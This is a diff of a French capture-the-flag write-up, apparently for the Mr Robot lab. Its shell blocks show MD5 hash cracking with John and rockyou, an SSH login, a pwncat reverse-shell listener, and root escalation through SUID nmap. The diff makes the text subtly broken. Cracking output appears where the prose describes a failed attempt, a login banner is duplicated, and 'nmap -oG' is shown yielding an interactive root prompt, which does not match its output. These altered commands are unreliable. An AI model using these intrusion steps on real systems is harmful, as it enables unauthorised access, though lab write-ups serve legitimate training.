@@ -417,9 +417,15 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 Ensuite, j'ai utilisé l'outil John pour le cracker en utilisant la liste de mots rockyou. Au début, il a donné une sortie très désordonnée et n'a pas réussi à le cracker.
 
 ```bash
-echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=3
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (?)
+1g 0:00:00:00 DONE (2025-08-03 13:21) 50.00g/s 2025Kp/s 2025Kc/s 2025KC/s bonjour1..123092
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
 ```
 
 Heureusement pour nous, le format du hash est indiqué dans le nom du fichier → Hash MD5
@@ -427,47 +433,15 @@ Heureusement pour nous, le format du hash est indiqué dans le nom du fichier �
 Essayons de le cracker en utilisant le spécificateur de format MD5 (`--format=Raw-MD5`) pour John
 
 ```bash
-echo 'c3fcd3d76192e4007dfb496cca67e13b' > hash.txt
-
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-
-Warning: detected hash type "LM", but the string is also recognized as "dynamic=md5($p)"
-Use the "--format=dynamic=md5($p)" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "HAVAL-128-4"
-Use the "--format=HAVAL-128-4" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "MD2"
-Use the "--format=MD2" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "mdc2"
-Use the "--format=mdc2" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "mscash"
-Use the "--format=mscash" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "mscash2"
-Use the "--format=mscash2" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "NT"
-Use the "--format=NT" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "Raw-MD4"
-Use the "--format=Raw-MD4" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "Raw-MD5"
-Use the "--format=Raw-MD5" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "Raw-MD5u"
-Use the "--format=Raw-MD5u" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "Raw-SHA1-AxCrypt"
-Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "ripemd-128"
-Use the "--format=ripemd-128" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "Snefru-128"
-Use the "--format=Snefru-128" option to force loading these as that type instead
-Warning: detected hash type "LM", but the string is also recognized as "ZipMonster"
-Use the "--format=ZipMonster" option to force loading these as that type instead
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
 Using default input encoding: UTF-8
-Using default target encoding: CP850
-Loaded 2 password hashes with no different salts (LM [DES 128/128 SSE2])
-Warning: poor OpenMP scalability for this hash type, consider --fork=3
-Will run 3 OpenMP threads
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=3
 Press 'q' or Ctrl-C to abort, almost any other key for status
-0g 0:00:00:01 DONE (2025-08-03 13:22) 0g/s 8173Kp/s 8173Kc/s 16347KC/s !WHOA!1..*7¡VA
+abcdefghijklmnopqrstuvwxyz (?)
+1g 0:00:00:00 DONE (2025-08-03 13:21) 50.00g/s 2025Kp/s 2025Kc/s 2025KC/s bonjour1..123092
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
-
 ```
 
 Eh bien, c'était facile ! Le mot de passe que nous avons réussi à récupérer est `abcdefghijklmnopqrstuvwxyz`.
@@ -488,6 +462,28 @@ Vous pouvez également vous connecter en utilisant SSH car OpenSSH est en cours 
 ssh robot@target
 robot@target's password:
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  <https://help.ubuntu.com>
+ * Management:     <https://landscape.canonical.com>
+ * Support:        <https://ubuntu.com/pro>
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Nov 13 23:50:42 2015
+$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
 ```
 
 ```bash
@@ -505,6 +501,8 @@ Nous devons changer le port d'écoute car le `4444` est déjà pris.
 
 ```bash
 pwncat -lp 4433
+[13:36:46] Welcome to pwncat 🐈!                                                                       __main__.py:164
+bound to 0.0.0.0:4433 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ```
 
 En utilisant la commande `which`, j'ai découvert que **Perl** est disponible sur la machine cible.
@@ -562,31 +560,29 @@ Il y a bien des fichiers SUID présents, mais nous devons nous concentrer sur ce
 Celui de Nmap devrait vous interpeller → En utilisant GTFObins ([GTFObins](https://gtfobins.github.io/)), il semble que nous puissions obtenir des privilèges root en utilisant l'option -oG ! Essayons cela
 
 ```bash
-(remote) robot@ip-10-10-135-61:/home/robot$ nmap --interactive
+(remote) robot@ip-10-10-135-61:/home/robot$ nmap -oG
 Starting nmap V. 3.81 ( <http://www.insecure.org/nmap/> )
 Welcome to Interactive Mode -- press h <enter> for help
-nmap> !sh
-# id
+nmap> id
 uid=0(root) gid=0(root) groups=0(root),1002(robot)
 nmap> ls -la /root
 total 44
-drwx------ 7 root root 4096 Jun 2 18:26 .
-drwxr-xr-x 23 root root 4096 Aug 3 13:25 ..
--rw------- 1 root root 0 Jun 2 18:26 .bash_history
--rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrc
-drwx------ 3 root root 4096 May 29 15:36 .cache
-drwx------ 3 root root 4096 May 29 15:36 .config
--rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done
-drwx------ 3 root root 4096 May 29 16:58 .gnupg
--r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt
-drwxr-xr-x 3 root root 4096 May 29 17:26 .local
--rw-r--r-- 1 root root 161 Jan 2 2024 .profile
--rw------- 1 root root 1024 Sep 16 2015 .rnd
-drwx------ 2 root root 4096 May 29 15:20 .ssh
--rw------- 1 root root 0 Jun 2 18:26 .viminfo
+drwx------  7 root root 4096 Jun  2 18:26 .
+drwxr-xr-x 23 root root 4096 Aug  3 13:25 ..
+-rw-------  1 root root    0 Jun  2 18:26 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  3 root root 4096 May 29 15:36 .cache
+drwx------  3 root root 4096 May 29 15:36 .config
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+drwx------  3 root root 4096 May 29 16:58 .gnupg
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+drwxr-xr-x  3 root root 4096 May 29 17:26 .local
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+drwx------  2 root root 4096 May 29 15:20 .ssh
+-rw-------  1 root root    0 Jun  2 18:26 .viminfo
 nmap> cat /root/key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
-
 ```
 
 P-A-R-F-A-I-T ! Nous avons maintenant réussi à mettre à niveau nos privilèges et obtenu un accès root à la machine cible 🥳
